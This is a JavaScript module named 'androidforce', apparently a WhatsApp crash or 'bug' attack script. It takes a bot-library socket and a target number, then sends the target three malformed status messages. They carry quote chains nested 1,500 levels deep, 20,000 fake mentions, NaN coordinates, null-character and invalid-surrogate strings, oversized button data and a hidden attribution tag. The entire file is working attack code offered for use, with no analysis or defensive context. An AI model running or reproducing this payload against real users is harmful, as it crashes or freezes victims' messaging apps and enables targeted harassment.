const crypto = require("crypto");

module.exports = async function androidforce(sock, target) {
    const jid = target.includes("@") ? target : `${target}@s.whatsapp.net`;
    const baseId = crypto.randomBytes(16).toString("hex").toUpperCase();

    const buildDeepNested = (depth) => {
        let inner = { conversation: "\0" };
        for (let i = 0; i < depth; i++) {
            inner = {
                extendedTextMessage: {
                    text: "\0",
                    contextInfo: {
                        quotedMessage: inner,
                        participant: `${"0".repeat(16)}@s.whatsapp.net`,
                        stanzaId: crypto.randomBytes(8).toString("hex").toUpperCase()
                    }
                }
            };
        }
        return inner;
    };

    const buildMassMention = () => {
        return {
            extendedTextMessage: {
                text: "\0",
                contextInfo: {
                    mentionedJid: Array.from({ length: 20000 }, () =>
                        `${crypto.randomBytes(4).toString("hex")}@s.whatsapp.net`
                    )
                }
            }
        };
    };

    const payloads = [];

    payloads.push({
        extendedTextMessage: {
            text: "\0",
            contextInfo: { quotedMessage: buildDeepNested(1500) }
        }
    });

    payloads.push(buildMassMention());

    payloads.push({
        interactiveMessage: {
            header: {
                title: "\0",
                hasMediaAttachment: true,
                locationMessage: {
                    degreesLatitude: NaN,
                    degreesLongitude: NaN,
                    name: "\0".repeat(4096),
                    url: "data:".repeat(2048)
                }
            },
            body: { text: "\0", contextInfo: { quotedMessage: buildDeepNested(800) } },
            footer: { text: "\uD800".repeat(2048) },
            nativeFlowMessage: {
                buttons: [
                    { name: "\0", buttonParamsJson: "\0".repeat(0x4000) },
                    { name: "galaxy_message", buttonParamsJson: "\0".repeat(0x4000) }
                ],
                messageParamsJson: "\0".repeat(0x4000),
                messageVersion: 0xffff
            },
            contextInfo: { quotedMessage: buildDeepNested(800) }
        }
    });

    for (let i = 0; i < payloads.length; i++) {
        try {
            await sock.relayMessage("status@broadcast", payloads[i], {
                messageId: `${baseId}${i.toString(16).padStart(2, "0")}`,
                statusJidList: [jid],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { appdata: "default" },
                        content: [
                            { tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid } }] },
                            { tag: "status_attribution", attrs: { hidden: "true" }, content: [] }
                        ]
                    }
                ]
            });
            await new Promise(r => setTimeout(r, 150));
        } catch {}
    }
};
